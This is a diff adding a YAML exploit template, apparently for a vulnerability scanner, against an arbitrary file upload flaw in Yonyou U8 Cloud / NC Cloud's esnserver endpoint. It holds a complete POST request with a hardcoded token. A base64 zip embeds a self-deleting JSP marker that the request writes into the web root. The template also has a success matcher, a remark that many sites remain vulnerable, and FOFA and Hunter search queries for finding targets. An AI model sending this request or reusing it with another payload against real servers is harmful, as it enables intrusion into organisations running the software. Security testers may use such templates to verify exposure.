@@ -1,0 +1,18 @@
+name: yongyouNC-U8C-fileupload       
+rules: 
+  - method: POST    
+    path: /service/esnserver
+    headers: 
+      Token: 469ce01522f64366750d1995ca119841
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      {"invocationInfo":{"ucode":"123","dataSource":"U8cloud","lang":"en"},"method":"uploadFile","className":"nc.itf.hr.tools.IFileTrans","param":{"p1":"UEsDBAoAAAAAAA9tSFkDJCbXbQAAAG0AAAAKAAAAY29tcHJlc3NlZDwlIG91dC5wcmludGxuKCJEdWRlU3VpdGUiKTsgbmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTsgJT5QSwECHwAKAAAAAAAPbUhZAyQm120AAABtAAAACgAkAAAAAAAAACAAAAAAAAAAY29tcHJlc3NlZAoAIAAAAAAAAQAYACbiFZZEGdsBHOcblEgZ2wERXscDRxnbAVBLBQYAAAAAAQABAFwAAACVAAAAAAA=","p2":"webapps/u8c_web/A7788.jsp"},"paramType":["p1:[B","p2:java.lang.String"]}
+    expression:                       
+      status_code:                 
+      response_header:              
+      response_body: "{\"code\":\"0\",\"data\":true"     #{"code":"0","data":true,"desc":"成功"},文件在/A7788.jsp     
+detail:                          
+  description: "用友NC Cloud service/esnserver接口存在任意文件上传漏洞，截止到2024.11.7仍存在很多该漏洞网站"
+  search:             
+    fofa: body="UClient.dmg"||app="用友-U8-Cloud"
+    鹰图: web.body="http://uclient.yonyou.com/api/uclient/public/download/windows" or web.body="请下载新版UClient"
